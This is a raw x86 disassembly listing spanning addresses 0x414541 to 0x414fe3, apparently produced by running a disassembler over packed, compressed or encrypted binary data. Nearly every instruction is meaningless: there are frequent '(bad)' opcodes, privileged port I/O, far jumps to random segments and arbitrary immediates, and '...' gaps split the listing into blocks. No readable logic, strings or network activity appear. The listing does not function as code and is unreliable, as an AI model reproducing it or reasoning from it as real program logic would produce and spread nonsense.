  414541:	lahf   
  414542:	stos   BYTE PTR es:[edi],al
  414543:	fldcw  WORD PTR [ebx+0x19]
  414546:	(bad)  
  414547:	stos   DWORD PTR es:[edi],eax
  414548:	test   eax,0x7573fb35
  41454d:	sub    BYTE PTR [eax],cl
  41454f:	ins    DWORD PTR es:[edi],dx
  414550:	xor    cl,BYTE PTR [ebp-0x2c21e944]
  414556:	push   0x31fae887
  41455b:	mov    al,0x3b
  41455d:	or     eax,0xd1240f75
  414562:	ja     0x414599
  414564:	es xor al,0xa9
  414567:	in     al,dx
  414568:	test   DWORD PTR [si+0x7c81],ebx
  41456d:	sub    al,0x6f
  41456f:	in     al,dx
  414570:	aam    0xd5
  414572:	out    0x4f,al
  414574:	test   eax,0x76a6c9e0
  414579:	dec    edi
  41457a:	arpl   di,sp
  41457c:	mov    BYTE PTR [edi],bh
  41457e:	cdq    
  41457f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414580:	nop
  414581:	sub    BYTE PTR [edx],cl
  414583:	shl    DWORD PTR [eax],cl
  414585:	in     eax,0xac
  414587:	fadd   st,st(7)
  414589:	pop    ebx
  41458a:	push   ds
  41458b:	scas   al,BYTE PTR es:[edi]
  41458c:	test   edx,esp
  41458e:	cs xor al,0x4e
  414591:	aam    0x56
  414593:	cmp    DWORD PTR [edi-0x51],ebx
  414596:	fcmovu st,st(7)
  414598:	xor    eax,0x7292a1b0
  41459d:	inc    ebx
  41459e:	imul   BYTE PTR [edi+0x72ab71e1]
  4145a4:	xchg   esp,eax
  4145a5:	xor    esp,esi
  4145a7:	jecxz  0x41452d
  4145a9:	in     eax,0x9b
  4145ab:	xchg   esp,eax
  4145ac:	mov    edi,0x24bfae12
  4145b1:	nop
  4145b2:	mov    esp,0xac1290fe
  4145b7:	and    ebp,DWORD PTR ds:0x9cdafcbf
  4145bd:	shl    DWORD PTR [eax+0x591c0629],0x5a
  4145c4:	adc    DWORD PTR ds:0x346e2249,ebx
  4145ca:	(bad)  [ebp+0x76f04657]
  4145d0:	(bad)  
  4145d1:	cli    
  4145d2:	(bad)  
  4145d3:	xor    eax,0x93a25a67
  4145d8:	add    ah,ch
  4145da:	out    0xde,eax
  4145dc:	sub    eax,0xddd28b03
  4145e1:	dec    edi
  4145e2:	in     eax,0x97
  4145e4:	dec    esi
  4145e5:	fprem1 
  4145e7:	dec    esi
  4145e8:	and    ch,BYTE PTR [edi-0x1a5746e3]
  4145ee:	push   ds
  4145ef:	dec    edx
  4145f0:	push   eax
  4145f1:	test   al,0x94
  4145f3:	movhps QWORD PTR [esi+0x1f543b03],xmm0
  4145fa:	test   eax,0xa8d7fdd1
  4145ff:	jge    0x414619
  414601:	fdiv   DWORD PTR [ebx]
  414603:	sbb    dh,ch
  414605:	test   DWORD PTR [esi-0x1a83cb76],0x4320bf39
  41460f:	push   cs
  414610:	std    
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x28
  414681:	jne    0x414675
  414683:	pusha  
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0x45000001
  41468d:	and    bl,dh
  41468f:	adc    DWORD PTR [eax+0x4e],ebp
  414692:	mov    eax,0xd8a29171
  414697:	es jnp 0x4146e9
  41469a:	mov    eax,0x8e17c606
  41469f:	sbb    dh,ah
  4146a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a2:	aas    
  4146a3:	dec    edx
  4146a4:	stos   DWORD PTR es:[edi],eax
  4146a5:	lock and eax,ecx
  4146a8:	mov    ch,0x4c
  4146aa:	xchg   edx,eax
  4146ab:	jns    0x414667
  4146ad:	push   edi
  4146ae:	inc    ecx
  4146af:	or     ch,BYTE PTR [ecx]
  4146b1:	mov    ds:0x3b52e118,eax
  4146b6:	jno    0x414680
  4146b8:	into   
  4146b9:	sbb    DWORD PTR [ebx],ebx
  4146bb:	nop
  4146bc:	into   
  4146bd:	lods   eax,DWORD PTR ds:[esi]
  4146be:	mov    bl,0x6a
  4146c0:	add    eax,0xbeee0708
  4146c5:	mov    BYTE PTR [esi+0x25d64b03],ah
  4146cb:	inc    ecx
  4146cc:	jl     0x414709
  4146ce:	arpl   WORD PTR [ebx+edi*1-0x2abfa976],bp
  4146d5:	adc    BYTE PTR [edi],cl
  4146d7:	cwde   
  4146d8:	clc    
  4146d9:	jmp    0x4146eb
  4146db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146dc:	jo     0x414671
  4146de:	mov    al,0xf6
  4146e0:	das    
  4146e1:	pop    esp
  4146e2:	dec    eax
  4146e3:	icebp  
  4146e4:	imul   eax,DWORD PTR [ebp-0x536b8d29],0x6c
  4146eb:	ja     0x4146d4
  4146ed:	ror    DWORD PTR [ebx-0xad692c1],cl
  4146f3:	les    ebx,FWORD PTR [edx]
  4146f5:	sbb    al,0x10
  4146f7:	test   DWORD PTR [eax-0x3524a20c],edi
  4146fd:	dec    ecx
  4146fe:	mov    edx,0x96af13a9
  414703:	ja     0x414743
  414705:	mov    edx,DWORD PTR [eax+0x2a7aa8cb]
  41470b:	mov    al,ds:0x2e451ea1
  414710:	lock cmp al,bh
  414713:	lods   al,BYTE PTR ds:[esi]
  414714:	imul   ecx,ebx,0x90f28c66
  41471a:	lds    ebx,FWORD PTR [eax-0x12]
  41471d:	add    al,0xff
  41471f:	shr    BYTE PTR fs:[edi+0x7714ea0f],1
  414726:	aas    
  414727:	rcr    BYTE PTR [edx+edx*2-0x2310a0e5],1
  41472e:	hlt    
  41472f:	push   es
  414730:	sbb    ecx,DWORD PTR [ebp+eax*2+0x53]
  414734:	xor    BYTE PTR [ebx+0x67],ah
  414737:	mov    gs,WORD PTR [esi-0x45]
  41473a:	je     0x4146cd
  41473c:	pusha  
  41473d:	and    eax,0x464ca2c3
  414742:	mov    esp,eax
  414744:	add    esp,DWORD PTR [ebx+ebx*8+0x68]
  414748:	das    
  414749:	adc    al,0x18
  41474b:	jo     0x414766
  41474d:	pop    ebx
  41474e:	sub    BYTE PTR [edx-0x20c8765f],0xbe
  414755:	hlt    
  414756:	dec    ebx
  414757:	hlt    
  414758:	mov    ebx,fs
  41475a:	call   0x2866:0xdcb29d49
  414761:	pop    ebx
  414762:	test   DWORD PTR ds:0xcf99e5b2,eax
  414768:	mov    ds,WORD PTR [ecx]
  41476a:	mov    esp,0x28d03d71
  41476f:	add    al,0xec
  414772:	xlat   BYTE PTR ds:[ebx]
  414773:	or     bl,BYTE PTR [eax+0x41540d1f]
  414779:	xor    ebp,DWORD PTR [ebx]
  41477b:	xchg   ebx,eax
  41477c:	sub    dh,BYTE PTR [eax+esi*4+0x4fd5db2d]
  414783:	imul   ebp,eax,0xffffffb8
  414786:	inc    esp
  414787:	jmp    0xef7c:0x465481be
  41478e:	xchg   edi,eax
  41478f:	sub    DWORD PTR [eax+0x0],0x0
	...
  4147f2:	add    BYTE PTR [eax],al
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x824e076b
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x61000001
  41480d:	push   ebx
  41480e:	mov    ebp,0x649910b3
  414813:	adc    DWORD PTR [ebx+0x55],esp
  414816:	xchg   ecx,eax
  414817:	arpl   WORD PTR [edx],bp
  414819:	or     al,0x1c
  41481b:	ja     0x414820
  41481d:	stc    
  41481e:	and    DWORD PTR [ecx+0xf],eax
  414821:	mov    bl,0xb3
  414823:	sbb    cl,BYTE PTR [ebx+0x795a267b]
  414829:	out    0xf0,eax
  41482b:	scas   eax,DWORD PTR es:[edi]
  41482c:	adc    BYTE PTR [esi],bh
  41482e:	ror    BYTE PTR gs:[ecx],1
  414831:	lea    esp,[ecx+0x39]
  414834:	xor    bh,BYTE PTR [ecx]
  414836:	addr16 retf 0x5cf
  41483a:	cmc    
  41483b:	mov    bh,0x76
  41483d:	je     0x4147e0
  41483f:	nop
  414840:	int3   
  414841:	or     eax,0x3cabc362
  414846:	cmp    ah,bl
  414848:	jecxz  0x414813
  41484a:	mov    DWORD PTR [eax-0x78d5100e],eax
  414850:	call   0xa0b6ec6b
  414855:	fmul   QWORD PTR [eax+0x6d]
  414858:	and    ebp,edx
  41485a:	and    ebp,DWORD PTR [ebp+0x42]
  41485d:	in     al,0x81
  41485f:	stc    
  414860:	dec    esp
  414861:	les    esp,FWORD PTR [edi+0x47607e31]
  414867:	inc    DWORD PTR [edx]
  414869:	jle    0x4148bb
  41486b:	jb     0x4148ba
  41486d:	sbb    ebp,esi
  41486f:	or     al,0x23
  414871:	enter  0x8625,0xb7
  414875:	mov    dl,0xf1
  414877:	pop    esi
  414878:	lods   al,BYTE PTR ds:[esi]
  414879:	jnp    0x4148a5
  41487b:	ins    BYTE PTR es:[edi],dx
  41487c:	jae    0x4148e4
  41487e:	cmp    cl,BYTE PTR [edx*2-0x316b8963]
  414885:	dec    edx
  414886:	inc    edi
  414887:	push   cs
  414888:	push   ecx
  414889:	je     0x4148c1
  41488b:	test   ah,cl
  41488d:	jno    0x41489d
  41488f:	pop    ebp
  414890:	xor    al,0x52
  414892:	jae    0x414900
  414894:	jbe    0x41489a
  414896:	neg    BYTE PTR [ebx+0x7a]
  414899:	add    BYTE PTR [ecx+edi*1-0x3e],bh
  41489d:	dec    eax
  41489e:	adc    al,0x70
  4148a0:	add    esp,DWORD PTR [esi-0x51b0ab68]
  4148a6:	jl     0x414878
  4148a8:	fcmovne st,st(4)
  4148aa:	inc    esp
  4148ab:	lahf   
  4148ac:	jbe    0x414880
  4148ae:	(bad)  
  4148af:	mov    edx,0x7296e20d
  4148b4:	mov    edx,ebx
  4148b6:	adc    al,0x4c
  4148b8:	pop    ss
  4148b9:	push   ss
  4148ba:	add    ch,cl
  4148bc:	cmp    BYTE PTR [edi+0x6e],0x94
  4148c0:	in     al,dx
  4148c1:	add    dh,0x4e
  4148c4:	out    0xe5,al
  4148c6:	fmul   DWORD PTR [esi]
  4148c8:	mov    esi,0x5c2d8439
  4148cd:	and    BYTE PTR ds:0x9713485d,0x27
  4148d4:	clc    
  4148d5:	add    edx,ecx
  4148d7:	mov    esi,0xf404b512
  4148dc:	loopne 0x4148c7
  4148de:	inc    ebp
  4148df:	xchg   ebx,eax
  4148e0:	std    
  4148e1:	loope  0x41487c
  4148e3:	sahf   
  4148e4:	sbb    BYTE PTR [edi],bh
  4148e6:	shr    DWORD PTR [eax],0x38
  4148e9:	je     0x4148be
  4148eb:	(bad)  
  4148ee:	(bad)  [eax-0x6d]
  4148f1:	adc    cl,ah
  4148f3:	pop    ds
  4148f4:	adc    edi,edi
  4148f6:	clc    
  4148f7:	or     al,0xa1
  4148f9:	jb     0x4148c9
  4148fb:	add    al,0x3b
  4148fd:	inc    eax
  4148fe:	dec    esi
  4148ff:	lods   al,BYTE PTR ds:[esi]
  414900:	xchg   edx,eax
  414901:	inc    ebp
  414902:	out    dx,eax
  414903:	fcom   QWORD PTR [esi-0x50624a31]
  414909:	shl    BYTE PTR [ebp+edi*8-0x153affce],0x5
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	mov    al,0xe0
  414982:	ja     0x41494a
  414984:	(bad)  
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR ds:0x14000001,al
  41498d:	(bad)  
  41498e:	mov    esp,0x86a4777e
  414993:	push   0x3a50d38
  414998:	out    0x5c,al
  41499a:	mov    ch,0xb8
  41499c:	xchg   esp,eax
  41499d:	(bad)  
  41499e:	lock mov eax,0x8af790d1
  4149a4:	ss daa 
  4149a6:	inc    edi
  4149a7:	jo     0x4149bf
  4149a9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4149ab:	and    dh,BYTE PTR [edi]
  4149ad:	arpl   WORD PTR [esi+0x12],di
  4149b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149b1:	into   
  4149b2:	int    0xc
  4149b4:	push   0xffffff8e
  4149b6:	or     bl,BYTE PTR [edi+0x25]
  4149b9:	push   ds
  4149ba:	cmp    BYTE PTR [eax-0x76],dl
  4149bd:	nop
  4149be:	pop    eax
  4149bf:	mov    cx,0x580b
  4149c3:	dec    ecx
  4149c4:	push   esi
  4149c5:	dec    edx
  4149c6:	loop   0x41497f
  4149c8:	adc    eax,0x6857f736
  4149cd:	sub    DWORD PTR ds:0x6e5a5cdf,eax
  4149d3:	pop    ss
  4149d4:	out    0x49,al
  4149d6:	stc    
  4149d7:	mov    edi,0x272d7025
  4149dc:	push   ebx
  4149dd:	inc    edx
  4149de:	into   
  4149df:	(bad)  
  4149e0:	les    esp,FWORD PTR [edx+ebx*1]
  4149e3:	mov    ah,0xa4
  4149e5:	out    0xd6,al
  4149e7:	xchg   edi,eax
  4149e8:	loopne 0x41498e
  4149ea:	and    eax,0xa7bcbb29
  4149ef:	das    
  4149f0:	mov    edx,0x71f6d132
  4149f5:	dec    edi
  4149f6:	shl    bl,0x8a
  4149f9:	imul   eax,DWORD PTR [ebp-0xb],0x9e456e16
  414a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a01:	xor    BYTE PTR [eax],bh
  414a03:	dec    ebp
  414a04:	dec    edi
  414a05:	or     BYTE PTR [edi],dl
  414a07:	stos   BYTE PTR es:[edi],al
  414a08:	xchg   ecx,eax
  414a09:	shl    ecx,1
  414a0b:	enter  0x413e,0x94
  414a0f:	aas    
  414a10:	shl    ebp,cl
  414a12:	cld    
  414a13:	and    edx,edi
  414a15:	mov    ebx,0xfb3bd919
  414a1a:	adc    BYTE PTR [edx+edi*8-0x1a],bh
  414a1e:	or     cl,ch
  414a20:	and    DWORD PTR [ebp+0xfb244cf],0x6a
  414a27:	cmovge ebx,DWORD PTR [eax+ecx*2+0x27e0a183]
  414a2f:	dec    edi
  414a30:	dec    esp
  414a31:	sahf   
  414a32:	xor    al,0x85
  414a34:	fistp  DWORD PTR [ebx]
  414a36:	push   0x4d
  414a38:	push   cs
  414a39:	je     0x414a82
  414a3b:	nop
  414a3c:	cmp    al,0x7f
  414a3e:	lock inc ebx
  414a40:	shr    BYTE PTR [ebp-0x44a24256],0x7
  414a47:	ret    0xbdf4
  414a4a:	pusha  
  414a4b:	sbb    eax,0xcd97e391
  414a50:	repz or al,0xe
  414a53:	cmp    al,0xd5
  414a55:	aaa    
  414a56:	ds push 0x9d7ff75d
  414a5c:	test   eax,0x1ead72ae
  414a61:	out    dx,al
  414a62:	mov    ds:0xcbce30ef,eax
  414a67:	daa    
  414a68:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414a6a:	sar    DWORD PTR [esp+edx*1+0xc],cl
  414a6e:	adc    DWORD PTR [ebp-0x5c6cdbe4],ebp
  414a74:	loopne 0x414aa1
  414a76:	test   esp,esp
  414a78:	mov    ah,dl
  414a7a:	js     0x414a2e
  414a7c:	out    dx,al
  414a7d:	xor    BYTE PTR [ebp+0x6b],0xd4
  414a81:	imul   ebx,DWORD PTR [ebp-0x46],0xffffffe8
  414a85:	fstp   TBYTE PTR [edx+0x28671e25]
  414a8b:	lock mov ch,0x91
  414a8e:	mov    eax,0xe92c
	...
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [edx+0x4fc420b],bp
  414b05:	fiadd  DWORD PTR [eax]
  414b07:	add    BYTE PTR ds:0x2f000001,al
  414b0d:	xchg   edx,eax
  414b0e:	pop    esi
  414b0f:	mov    ebx,0x503c7dfb
  414b14:	push   eax
  414b15:	or     cl,BYTE PTR [esp+edi*2-0x55]
  414b19:	adc    cl,BYTE PTR ds:[ebx+0x121713b2]
  414b20:	int    0x91
  414b22:	xlat   BYTE PTR ds:[ebx]
  414b23:	inc    ecx
  414b24:	aas    
  414b25:	dec    ebx
  414b26:	or     BYTE PTR [eax-0x35d2300c],dl
  414b2c:	sbb    eax,0xc85bd60b
  414b31:	xor    bl,BYTE PTR [ebx+ebx*4]
  414b34:	je     0x414b93
  414b36:	in     al,dx
  414b37:	jns    0x414b15
  414b39:	mov    ebx,0xcf44029b
  414b3e:	pop    ebx
  414b3f:	stos   BYTE PTR es:[edi],al
  414b40:	mov    bl,0x72
  414b42:	in     al,0x26
  414b44:	fwait
  414b45:	mov    dl,0x7d
  414b47:	xchg   BYTE PTR [ebp-0x4c],bl
  414b4a:	mov    WORD PTR [ecx+0x3d],ds
  414b4d:	pop    edi
  414b4e:	fwait
  414b4f:	adc    eax,0x8822e37d
  414b54:	pop    esp
  414b55:	jmp    0xe048:0x12ea3820
  414b5c:	not    DWORD PTR [edx]
  414b5e:	neg    ah
  414b60:	inc    eax
  414b61:	push   ebp
  414b62:	loop   0x414b86
  414b64:	sbb    al,BYTE PTR [edx+0x31bee341]
  414b6a:	mov    ecx,0xf75ac1d3
  414b6f:	int    0xa1
  414b71:	test   al,0xd
  414b73:	inc    ebx
  414b74:	mov    ah,0x8f
  414b76:	loopne 0x414b1a
  414b78:	lock test DWORD PTR [eax-0x26138eb0],ebp
  414b7f:	loope  0x414b94
  414b81:	cli    
  414b82:	mov    ds:0x59ea4294,al
  414b87:	(bad)  
  414b88:	bound  esi,QWORD PTR [ecx]
  414b8a:	push   ebp
  414b8b:	pop    ss
  414b8c:	mov    ebp,0x306b66be
  414b91:	leave  
  414b92:	fisub  WORD PTR [edx+0x32]
  414b95:	fs fwait
  414b97:	mov    ecx,0xc3664569
  414b9c:	jns    0x414b4f
  414b9e:	dec    ebx
  414b9f:	mov    bh,0x36
  414ba1:	mov    ah,0xc5
  414ba3:	push   edi
  414ba4:	sbb    bh,BYTE PTR ds:0xa0a2a5bb
  414baa:	cmp    eax,DWORD PTR ds:0xff2d3c68
  414bb0:	mov    ebp,0xc3c35f66
  414bb5:	pop    esi
  414bb6:	(bad)  
  414bb8:	(bad)  
  414bb9:	cmp    ebx,DWORD PTR [edx+eiz*4+0x2949a287]
  414bc0:	xchg   DWORD PTR [edx],edi
  414bc2:	jnp    0x414c27
  414bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc5:	lds    edi,FWORD PTR [ebx-0x1c]
  414bc8:	test   BYTE PTR [ebx],dh
  414bca:	dec    ebp
  414bcb:	dec    esi
  414bcc:	sahf   
  414bcd:	out    dx,eax
  414bce:	xchg   ecx,eax
  414bcf:	iret   
  414bd0:	shr    BYTE PTR [eax+ebx*2+0x221f6e8d],0x4e
  414bd8:	push   0xe
  414bda:	pop    ss
  414bdb:	mov    edi,0x66bc2565
  414be0:	dec    edx
  414be1:	into   
  414be2:	adc    bl,BYTE PTR cs:[edi]
  414be5:	push   cs
  414be6:	fwait
  414be7:	les    eax,FWORD PTR ds:0xc311f222
  414bed:	cwde   
  414bee:	push   ebx
  414bef:	in     al,dx
  414bf0:	sub    eax,0x6e339100
  414bf5:	mov    dh,0x3d
  414bf7:	or     eax,0x92ddc21f
  414bfc:	dec    ebp
  414bfd:	ror    ch,1
  414bff:	sbb    bh,al
  414c01:	sub    DWORD PTR [esi+0x24],ecx
  414c04:	sar    DWORD PTR [eax+ecx*1+0x5917b80b],0xb7
  414c0c:	mov    ebx,0x637c36
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[ecx]
  414c81:	sbb    DWORD PTR [edi-0x2c],ecx
  414c84:	or     ebx,ebx
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    eax,0x83000001
  414c8d:	sbb    DWORD PTR [esi+0x6f28bba0],ebx
  414c93:	dec    eax
  414c94:	jmp    0x414c6b
  414c96:	mov    ecx,0x1d65b3ce
  414c9b:	push   0x842c9f7c
  414ca0:	add    dh,BYTE PTR [edi-0x129320af]
  414ca6:	jl     0x414d24
  414ca8:	test   BYTE PTR [ecx+edx*1-0x22],dl
  414cac:	lea    ebp,[edx+eax*2+0x34232d9e]
  414cb3:	jbe    0x414d09
  414cb5:	sbb    esp,DWORD PTR [edi]
  414cb7:	or     al,0x84
  414cb9:	xchg   ebx,eax
  414cba:	jmp    0xd5fb:0xb3474428
  414cc1:	push   edi
  414cc2:	repnz push esp
  414cc4:	mov    bl,0x93
  414cc6:	int3   
  414cc7:	mov    ecx,0xaa6cb45d
  414ccc:	cmp    DWORD PTR [edx-0x4aeeb067],0xcf2192d0
  414cd6:	push   ds
  414cd7:	std    
  414cd8:	ds pop ebp
  414cda:	mov    dl,0x19
  414cdc:	or     DWORD PTR [edx-0x6d],esi
  414cdf:	and    BYTE PTR [esi-0x5d],cl
  414ce2:	dec    esp
  414ce3:	cmp    esi,DWORD PTR [edi+esi*1-0x56ef43c5]
  414cea:	shl    esi,cl
  414cec:	imul   ebx,ecx,0x4f212594
  414cf2:	scas   eax,DWORD PTR es:[edi]
  414cf3:	xchg   ecx,eax
  414cf4:	int    0xd1
  414cf6:	sahf   
  414cf7:	popa   
  414cf8:	in     eax,dx
  414cf9:	xor    DWORD PTR [edi*4-0x20094cbc],ecx
  414d00:	shr    BYTE PTR [esi+edi*8+0x3fb268ff],0xba
  414d08:	xchg   DWORD PTR [ebx],ecx
  414d0a:	jge    0x414d48
  414d0c:	inc    ebp
  414d0d:	mov    ds:0x1e9071c8,eax
  414d12:	mov    ch,0xb4
  414d14:	fwait
  414d15:	iret   
  414d16:	sub    eax,0xae3b8626
  414d1b:	cwde   
  414d1c:	mov    al,0xfe
  414d1e:	in     al,dx
  414d1f:	addr16 dec ebp
  414d21:	or     bl,al
  414d23:	mov    al,ds:0x12659777
  414d28:	shl    dh,cl
  414d2a:	push   eax
  414d2b:	pop    ecx
  414d2c:	inc    ebx
  414d2d:	or     bl,BYTE PTR es:[edx-0xa35861]
  414d34:	pop    ebp
  414d35:	popa   
  414d36:	leave  
  414d37:	add    al,0x7d
  414d39:	hlt    
  414d3a:	js     0x414d0e
  414d3c:	ror    BYTE PTR [ebp+0x7a],1
  414d3f:	mov    esp,0x94b65408
  414d44:	push   0x5e
  414d46:	repz jno 0x414dbd
  414d49:	popa   
  414d4a:	hlt    
  414d4b:	xchg   BYTE PTR [ebx+0x1c19fd87],ah
  414d51:	popa   
  414d52:	pushf  
  414d53:	xchg   ebx,eax
  414d54:	xchg   edx,eax
  414d55:	ss ss inc ebp
  414d58:	mov    esi,0xb567a0d4
  414d5d:	mov    dh,0x9e
  414d5f:	mov    bl,0xd6
  414d61:	inc    edx
  414d62:	inc    edi
  414d63:	or     eax,0xed1dd9fb
  414d68:	jmp    0x71d18e62
  414d6d:	(bad)  
  414d6e:	into   
  414d6f:	cmp    BYTE PTR [ecx-0x1b],bl
  414d72:	cmp    edi,edx
  414d74:	sub    dh,dl
  414d76:	sub    BYTE PTR [ecx],bl
  414d78:	add    edi,DWORD PTR [eax+0x23366a06]
  414d7e:	inc    edi
  414d7f:	je     0x414dbf
  414d81:	in     al,0x7d
  414d83:	inc    ecx
  414d84:	inc    esp
  414d85:	adc    al,0xb
  414d87:	(bad)  
  414d88:	fldenv [edi+esi*1-0x650d66d7]
  414d8f:	leave  
  414d90:	dec    ebx
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x5084be91
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0xcf000001,al
  414e0d:	mov    edi,0xaab7eea8
  414e12:	add    edx,DWORD PTR [ebp-0x13]
  414e15:	shl    DWORD PTR [edx-0xd1d5fe],0x9c
  414e1c:	sbb    eax,0x461b356f
  414e21:	jne    0x414e08
  414e23:	or     BYTE PTR [esi+esi*4-0x40],al
  414e27:	inc    ebp
  414e28:	mov    ds:0x2366a50,al
  414e2d:	(bad)  
  414e2e:	dec    eax
  414e2f:	push   es
  414e30:	xor    cl,0xb1
  414e33:	setp   BYTE PTR [ebp+ecx*2-0xf]
  414e38:	pushf  
  414e39:	inc    edx
  414e3a:	xor    esp,DWORD PTR [ecx+ecx*8]
  414e3d:	mov    ds:0x6ac42300,al
  414e42:	cmp    dh,dh
  414e44:	jnp    0x414e09
  414e46:	clc    
  414e47:	add    ebp,ecx
  414e49:	(bad)  
  414e4a:	js     0x414e90
  414e4c:	leave  
  414e4d:	sub    al,BYTE PTR [edx+0x38]
  414e50:	popa   
  414e51:	fld    DWORD PTR [esp+ebx*4+0x49]
  414e55:	and    al,0xc
  414e57:	cli    
  414e58:	jno    0x414e0e
  414e5a:	push   cs
  414e5b:	xor    BYTE PTR [ebp-0x37],dl
  414e5e:	fstp   QWORD PTR [edi-0x3d]
  414e61:	jmp    0xa038:0xc62c851f
  414e68:	push   0x9788852f
  414e6d:	inc    esp
  414e6e:	mov    BYTE PTR [edx+0x34b2ed95],ah
  414e74:	and    BYTE PTR [esp+ebx*1+0x48dc3457],0xfc
  414e7c:	xchg   eax,edi
  414e7e:	out    0x9a,eax
  414e80:	std    
  414e81:	mov    ch,0x7c
  414e83:	or     dl,BYTE PTR [edi-0x1b]
  414e86:	aas    
  414e87:	fcmove st,st(2)
  414e89:	pop    ss
  414e8a:	mov    eax,0x1981e8ac
  414e8f:	xchg   edi,eax
  414e90:	cmp    al,al
  414e92:	jae    0x414e27
  414e94:	je     0x414ef9
  414e96:	mov    ecx,0xae1fe9b7
  414e9b:	sub    al,0x42
  414e9d:	jle    0x414ed4
  414e9f:	test   eax,0x6db330c9
  414ea4:	sbb    eax,0x5944b112
  414ea9:	and    BYTE PTR [ebx],al
  414eab:	xchg   esp,eax
  414eac:	daa    
  414ead:	or     BYTE PTR [ebp+0xf],al
  414eb0:	inc    eax
  414eb1:	jae    0x414ee3
  414eb3:	out    dx,al
  414eb4:	ret    
  414eb5:	push   es
  414eb6:	lds    edx,FWORD PTR [esp+edi*2-0x5b]
  414eba:	popf   
  414ebb:	pusha  
  414ebc:	dec    edx
  414ebd:	mov    edx,0xa862e693
  414ec2:	nop
  414ec3:	add    eax,0xd95d8101
  414ec8:	xor    DWORD PTR [ecx+0x1011d18a],0x5e
  414ecf:	inc    edi
  414ed0:	xor    al,BYTE PTR [eax]
  414ed2:	retf   
  414ed3:	xchg   ecx,eax
  414ed4:	jb     0x414f23
  414ed6:	lods   al,BYTE PTR ds:[esi]
  414ed7:	bswap  eax
  414ed9:	pop    es
  414eda:	jnp    0x414e64
  414edc:	xor    ch,BYTE PTR [eax-0xf46cec1]
  414ee2:	dec    edi
  414ee3:	fxtract 
  414ee5:	aaa    
  414ee6:	ret    
  414ee7:	jo     0x414eac
  414ee9:	cmp    al,0x75
  414eeb:	cmp    eax,0x3c6a8dd3
  414ef0:	shr    BYTE PTR [esi+0x75],cl
  414ef3:	bound  edi,QWORD PTR [ebp+eiz*4+0x37b8ddb6]
  414efa:	pop    ss
  414efb:	inc    ebx
  414efc:	mov    dh,0x85
  414efe:	add    DWORD PTR [edi],ebp
  414f00:	call   0xc018:0x552a8fef
  414f07:	or     eax,0x809fd0be
  414f0c:	dec    ecx
  414f0d:	or     ebp,DWORD PTR [edx+0x58]
  414f10:	jg     0x414f12
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xc6731c66
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x6f000001
  414f8d:	sbb    dl,BYTE PTR [esi-0x1]
  414f90:	push   eax
  414f91:	dec    ecx
  414f92:	pop    esi
  414f93:	dec    ebp
  414f94:	inc    esp
  414f95:	pop    edx
  414f96:	cs mov ebx,0xcd5b3afe
  414f9c:	stc    
  414f9d:	(bad)
  414fa1:	in     eax,dx
  414fa2:	pop    eax
  414fa3:	popa   
  414fa4:	idiv   BYTE PTR [ebx+0x1b]
  414fa7:	pop    ebx
  414fa8:	ret    
  414fa9:	push   ss
  414faa:	loope  0x414f52
  414fac:	or     DWORD PTR [ecx],0x19
  414faf:	add    eax,0x5624c7a0
  414fb4:	mov    dh,0xbf
  414fb6:	sbb    eax,0x343fd1c6
  414fbb:	push   esp
  414fbc:	mov    ch,0x11
  414fbe:	pop    esp
  414fbf:	aaa    
  414fc0:	lods   al,BYTE PTR ds:[esi]
  414fc1:	pop    esi
  414fc2:	or     bh,0x2a
  414fc5:	ds dec ebx
  414fc7:	fimul  DWORD PTR [esp+eiz*4-0x37]
  414fcb:	inc    ebp
  414fcc:	sbb    DWORD PTR [edi+edx*2-0x267e2000],ebp
  414fd3:	loope  0x414f81
  414fd5:	mov    ebx,0x6ab5b351
  414fda:	or     eax,0xd1917e38
  414fdf:	mov    ah,0x60
  414fe1:	cs ret 
  414fe3:	and    eax,0xcd3a81fc
